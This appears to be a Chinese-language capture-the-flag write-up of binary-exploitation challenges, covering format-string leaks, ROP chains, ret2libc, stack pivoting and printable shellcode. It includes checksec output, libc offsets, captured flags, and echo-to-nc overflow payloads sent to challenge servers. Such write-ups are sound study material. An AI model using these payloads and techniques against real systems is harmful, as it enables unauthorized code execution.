這裡取得 0x6161616661616165aaacaaadaaaeaaafaaagaaahaaa ，該值在 %10$p 而 0x65 為 'e' ，因此由 e 往後取 8 個就是 offset ，由 aaadaaae 第一個 a 開始寫入，該位置填入 0x404050
如果該解法無法正常運行請參考 fmt-2 也有一樣的手法

經過分析可以發現 data 為 long 因此 %s ，靠 ( 255/256)^16 的運氣

![./img/Untitled%20111.png](./img/Untitled%20111.png)

```
FLAG{f0rm47_5tring_told_y0u_the_secr3t}
```

## pwn baby_fmt

```
gef➤  checksec
[+] checksec for '/home/ubuntu/baby_fmt'
Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
```



不可寫 got, 

x64

baby_fmt_list.py

先透過一個腳本列出 1-100 個 fmtstr 位置，之後找到需要的如，為了方便使用

靜態分析 main 發現奇怪的指令，發現題目提示 flag on the stack ，透過前面的 baby_fmt_list.py 找到該字串的偏移，找尋   0x6568377b47414c46 ，可以發現在 %6$p 出現 0x6568377b47414c46

![./img/Untitled%20112.png](./img/Untitled%20112.png)

![./img/Untitled%20113.png](./img/Untitled%20113.png)

而該位置只有被 rsp 指向，因此可用 `%6$p%7$p` 等等的方法洩漏，該方法每個位置佔用 4 bytes，而限制是 0x2f = 47 至少可以放 11 個

![./img/Untitled%20114.png](./img/Untitled%20114.png)

這題看起來寫壞了， local 和 remote 的 flag 相同 `FLAG{7he_f14g_0n_th3_st4ck!!!!!!}`

## level 4 張元_Pwn-5 memo_manager

保護都全開

![./img/Untitled%20115.png](./img/Untitled%20115.png)

如果有辦法填滿三個 memo pages, 就可以改變 ulen 的長度，而為了溢出使 ulen 變成 0x35，之後可以透過修改第三個 pages 來達成溢出的效果，一旦溢出後可以蓋寫 canary 的 \0 byte 而洩漏資訊

之後 rop chain 只能寫入兩個 gadgets 實際上會有兩個 bytes 被截斷 0x38 → 0x36 ，但程式本生的 image 不受影響可忽略。

one-gadget 是否可以使用？ 但是 one-gadget 需要洩漏 libc 地址

echo 擁有更大的空間，如果有辦法透過 echo 的位置來保存，並且轉移 esp 到上面

![./img/Untitled%20116.png](./img/Untitled%20116.png)

又或者 echo 因為 buffer 沒有清空，可以 leak libc 和 rbp ，rbp 是 b'a'*0x20， libc 是 b'a' * 0x48

![./img/Untitled%20117.png](./img/Untitled%20117.png)

rbp 是 read_chk 的 rbp ，libc 因為版本不一定相同因此還無法確定 offset 沒有附贈 libc ，根據以往解題如果為

GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

GLIBC_2.2.5

先猜測 libc6_2.23-0ubuntu11.2_amd64

[https://libc.nullbyte.cat/?q=_rtld_global%3A0&l=libc6_2.23-0ubuntu11.2_amd64](https://libc.nullbyte.cat/?q=_rtld_global%3A0&l=libc6_2.23-0ubuntu11.2_amd64)

![./img/Untitled%20118.png](./img/Untitled%20118.png)

![./img/Untitled%20119.png](./img/Untitled%20119.png)

再來盲猜 remote libc 的 base ，因為是 atoi 在這裡的 offset 是 0x36e90 ，假設沒有修改在 0x36e90+16 

[https://libc.nullbyte.cat/d/libc6_2.23-0ubuntu11.2_amd64.symbols](https://libc.nullbyte.cat/d/libc6_2.23-0ubuntu11.2_amd64.symbols)

可以看到遠程像是正常的 base

![./img/Untitled%20120.png](./img/Untitled%20120.png)

測試了一下 remote 的 libc 是正確的，但是 one gadgets 無法執行，因為還可以塞一個 gadgets ，直接把 rax 設成 0 在 return

後來看了一下是 libc 不正確，因為先猜測的 libc 透過 atoi 算出 puts 是可以運行的，因此只有找到一個 libc 在下載之後透過 objdump 檢查 symbols 的 offset 都相同後，再次產生 one gadget 就可以正常運作

```
BreakALLCTF{bHrZz46Z3ufph1PbeYyl}
```

## level 1 registration

如果想要蓋 return address 的話 一定會蓋寫到 id ，所以這題需要用 pwntools 讀取之後在送，gets 只在 \n 停止

![./img/Untitled%20121.png](./img/Untitled%20121.png)

## level 1 gohome

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

後門 不解釋

![./img/Untitled%20122.png](./img/Untitled%20122.png)

![./img/Untitled%20123.png](./img/Untitled%20123.png)



```
# 0x4006c6 = '\xc6\x06\x40\x00\x00\x00\x00\x00'
echo -e $'BBBBBBBBAAAAAAAABBBBBBBBAAAAAAAArbprbprb\xc6\x06\x40\x00\x00\x00\x00\x00' | nc 140.110.112.77 6126

Billy want to go home now.
Do you know the address of his house ?MyFirstCTF{r3tURn_t0_3h3rev3R_U_w4nT_tO_g0_XD}
```



## level 1 pass

不解釋

![./img/Untitled%20124.png](./img/Untitled%20124.png)

```
echo -n $'AAAABBBBAAAABBBBAAAABBBBAAAA\xef\xbe\xad\xde' | nc 140.110.112.77 6125

FLAG{xtnntfhzflpttvxvzzbfjfnxbjvrzxdfvzlvhpt}
MyFirstCTF{L0c41_vARiaBl3_0n_Th3_sT4cK?!}
```

## level 4 rop3-sean_Pwn-4

x64

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

感覺水水的，gets 除了 \n 和結尾以外，其他都不管，也因此只要編碼掉 \n 字元就可以寫 ROP chain，但感覺還是直接 leak libc address 比較方便，因此採用 level 4 Angelboy_Pwn-7 的手法

![./img/Untitled%20125.png](./img/Untitled%20125.png)

![./img/Untitled%20126.png](./img/Untitled%20126.png)

## level 3 張元_Pwn-3

strlen 可以透過 \0 字元繞過，這題感覺用 `ROPgadget --binary rop --ropchain` 產生之後稍微改一改就可以了

![./img/Untitled%20127.png](./img/Untitled%20127.png)

## level 4 Angelboy_Pwn-7

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

RELRO full 代表無法 got hijack

rop 題目？ 

X86 所以可以直接在 stack 裡面放參數，

GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

思路，先洩漏 libc ，再來找到 system 的地址，為了方便把 stack 轉移到 .data 段可寫的位置，可以透過 vmmap 查看 data 段的末端，通常空間都夠作為 stack

再來透過 libc 搜尋工具找到對映的 libc 

[https://libc.blukat.me/](https://libc.blukat.me/)

注意要透過遠程連上時得到的地址才是正確的，本機看到的只能在本機使用，這時在本機已經可以 get shell ，但是遠程似乎因為地址的問題無法顯示 address，猜測含有 \0  字元，因此稍微偏移之後就可以讀取到 GOT 數值。

![./img/Untitled%20128.png](./img/Untitled%20128.png)

並且獲取地址相關資訊，可知 puts - 0x24f00 就會是 system, 之後 system + 0x120d5b 就是 bin/sh

![./img/Untitled%20129.png](./img/Untitled%20129.png)

```
AngelboyCTF{bhRXcxAzd3ZrsvVlPpQG}
```

## level 4 張元_Pwn-4 name

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609) 或許可猜 gcc 版本

必須注意 read 大小過大可能可以利用，而 0x20 = 32 ，剛好可以接觸 rbp 和 rip ，而這題應該是 printable shellcode 唯一需要注意的是大小 限制在 0x61 = 97。

![./img/Untitled%20130.png](./img/Untitled%20130.png)

至於 0x61 的限制，msfvenom 使用 `--smallest` 依然過大，因此先嘗試進行 read

```
context.os='linux'
context.arch = 'amd64'

asm(shellcraft.read('rbp', 0x200) + 'jmp rbp')
echo -n '1\xc0H\x89\xefj\x08Z\xbe\x01\x01\x01\x01\x81\xf6\x01\x03\x01\x01\x0f\x05\xff\xe5' |msfvenom -a x64 --platform linux -p - -e x64/alpha_mixed BufferRegister=RBP -f python --smallest
```

上面是不可行的，因為 msf 沒有 x64/alpha_mixed 可以使用

在 github 找到相關的東西，但是該工具會讓 shellcode 變 20 倍長，或者 444 長

[https://github.com/rcx/shellcode_encoder](https://github.com/rcx/shellcode_encoder)

```
asm(shellcraft.read('rbp', 0x200) + 'jmp rbp')
echo -n $'1\xc0H\x89\xefj\x08Z\xbe\x01\x01\x01\x01\x81\xf6\x01\x03\x01\x01\x0f\x05\xff\xe5' > non-encode

./main.py non-encode rbp
```

嘗試直接利用程式本身的 read 並且觀察可以用的記憶體與暫存器

![./img/Untitled%20131.png](./img/Untitled%20131.png)

![./img/Untitled%20132.png](./img/Untitled%20132.png)

由於 read 要從 stdin ，因此 edi 必須為 0 ，可以採用 pop rdi 正好是可見字元，最後需要跳到 read ，因為 read  與 name 距離不遠，有 printable 指令可以使用，但是 call 之類的指令並沒有可用的指令，必須自行編碼

```
for c in string.printable: disasm(p8(ord(c)))
```

[http://ref.x86asm.net/coder64.html](http://ref.x86asm.net/coder64.html)

xor 的侷限是  < 0x80 ，否則需要透過 inc 或 dec 的方式夠照

似乎可以使用 2D SUB RAX imm16/32 ，但 adc 依然被侷限不是可印字元

換個方法進行 stack proivit ，並且在後面一個 read 寫入 shellcode之後 ret2shellcode ，在轉移 rsp 之後，有一次改變 rbp 和 ret address 的機會，而 shellcode 只能限制在 16 的 bytes ，可以考慮處理 rdi 和 rdx 與 rsi 到正確位置

之後到 rip 到 data 之後，嘗試讀取 shellcode 到 data  之後跳到 shellcode

## level 4 張元_Pwn-2

保護幾乎全關

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

可以看到先讀取之後執行

![./img/Untitled%20133.png](./img/Untitled%20133.png)

這裡如果先把 edx 設定大一點在跳就可以完成了，可以跳到 0x40063d

![./img/Untitled%20134.png](./img/Untitled%20134.png)

兩碼做 jmp ，所以剩下 4 碼可以 mov edx, 更大的值，但是實際上是在 data 段進行，所以 jmp 還是不夠可行，發現 r12 的地址指向 _start，因此可以 jmp r12 來多次執行程式碼(3 bytes)，一開始先保存 main 的地址，因為 main addr 在 stack 有值可以使用，該值為 call shell code 之後的 return address 然後可以用 al 暫存器來進行減法

